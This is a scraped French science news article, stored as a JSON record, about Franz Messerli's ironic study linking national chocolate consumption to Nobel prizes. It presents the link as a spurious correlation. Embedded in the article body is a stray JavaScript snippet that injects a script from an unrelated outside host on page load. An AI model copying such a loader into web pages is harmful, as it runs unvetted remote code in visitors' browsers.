{"title": "Science décalée : faut-il manger du chocolat pour être prix Nobel ?", "newspaper": "Futura Sciences", "author": "Par Janlou Chaput, Futura", "date_publi": "02/12/2017", "content": "Le scientifique Franz Messerli a un jour fait un constat troublant : les pays qui reçoivent le plus de prix Nobel proportionnellement à leur population sont aussi ceux qui consomment davantage de chocolat par personne. Faut-il y voir un lien ? Probablement pas. Mais la corrélation a de quoi faire sourire. Saviez-vous que le nombre de  cigognes  sur un territoire est lié à la natalité d'un pays ou qu'on peut faire un rapprochement entre la quantité de lampadaires et le taux de  suicides  ? Dans la famille « corrélations stupides », on pourra ajouter le rapport établi par Franz Messerli entre la consommation de  chocolat  par habitant d'un pays et la propension de ce dernier à fournir des prix Nobel en tous genres. Le contexte : du chocolat bénéfique pour le cerveau Le chocolat, comme le  thé  vert ou le vin rouge, pourrait nous rendre plus intelligent. C'est du moins ce que constatent certaines études qui attribuent cette propriété aux flavanols contenus dans ces denrées, qui ralentiraient voire neutraliseraient le  déclin cognitif  dû à l'âge. Concrètement, on vieillit mais le  cerveau reste jeune . Cependant, cela ne fait pas l'unanimité dans le monde de la recherche et les experts en débattent.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Franz Messerli, du  Saint Luke’s-Roosevelt Hospital  de New York, était en voyage à Katmandou, au Népal. N'ayant rien à faire pour s'occuper dans sa chambre d'hôtel, il a eu l'idée de vérifier de manière très théorique l'impact de ces flavanols sur l' intelligence . Pour estimer la consommation de chocolat, il est allé s'en référer aux ventes des plus grands producteurs dans 22 pays du monde. Pour mesurer l' intelligence , quoi de mieux que les prix Nobel ? Le voici sur l'encyclopédie participative en ligne  Wikipédia  pour relever le nombre de personnes distinguées par pays depuis le début jusqu'à l'édition 2011. Le tout a été comparé par des tests statistiques et finalement publié dans le très sérieux  New England Journal of Medicine   qui profite de l'actualité pour sortir cet article. Le chimiste suédois Alfred Nobel (1833-1896) a légué une grande partie de sa fortune à sa mort pour l'instauration du prix Nobel. Probablement ignorait-il que le chocolat allait aider les scientifiques à recevoir la célèbre récompense... © AlphaZeta, Wikipédia, DP                       L’étude : des prix Nobel forts en cacao Le chercheur, non sans ironie, se dit stupéfait par les résultats observés. Plus la consommation de chocolat par habitant est forte, plus un territoire a de chances de fournir un prix Nobel, si on le rapporte à sa population. En tête de ce classement, les Suisses, plus gros consommateurs de  cacao  (rien de surprenant) et parmi les pays les plus distingués par tête de pipe. Si l'on excepte la Suède pour le moment, l'auteur a pu établir un coefficient de corrélation entre les données comparées, égal à 0,862. La France figure au milieu d'un peloton regroupant les États-Unis, l'Irlande et les Pays-Bas, derrière le Danemark, l'Autriche, la Norvège, la Grande-Bretagne ou l'Allemagne. Pour qu'un État obtienne davantage de récompenses, il lui faudrait augmenter sa consommation de  chocolat  par habitant de 400 g chaque année. Soit 1,1 g de plus par jour... Comme précisé, la Suède est un cas bien particulier. Aussi friands du chocolat que les Français, ils auraient dû, si l'on se fie aux calculs, obtenir 14 prix Nobel. Or ils en ont reçu 32. Messerli y voit deux explications possibles. La première considère que les Scandinaves n'ont besoin que de très peu de chocolat pour que le  cerveau  tourne à plein régime, théorie contestable. La seconde y voit plutôt un biais de la part des juges. Le  jury Nobel  se réunissant à Stockholm, il pourrait se montrer plus généreux vis-à-vis des scientifiques suédois... Cependant, l'auteur reconnaît que l'intelligence ne s'explique pas forcément par le chocolat, apportant une autre hypothèse. Les prix Nobel pourraient être des gens tellement savants qu'ils connaîtraient les vertus du  cacao  sur l'intellect, expliquant ainsi pourquoi ils en mangent davantage... L’œil extérieur : un peu d’humour, ça ne fait jamais de mal Bien évidemment, ce travail n'est pas à prendre au sérieux et Franz Messerli a tout simplement voulu s'amuser un peu. Pourtant, ces résultats ne surprennent pas Eric Cornell, distingué en 2001 pour ses travaux de  physique . «  La consommation nationale de chocolat est corrélée à la richesse d'un pays et la recherche de haute qualité est elle aussi corrélée avec la richesse d'un pays. [...] Il n'y a pourtant aucun lien entre les deux.  » N'aurait-il pas compris l'ironie de l'étude ? Bien sûr que si. Car il conclut en précisant qu'il est un grand adepte du  cacao  le plus pur. «  Si vous voulez un   prix Nobel de chimie   ou de   médecine , vous pouvez vous permettre du chocolat au lait, mais pour un   prix Nobel de physique , le chocolat noir est plus conseillé.  » ", "theme": "sante"}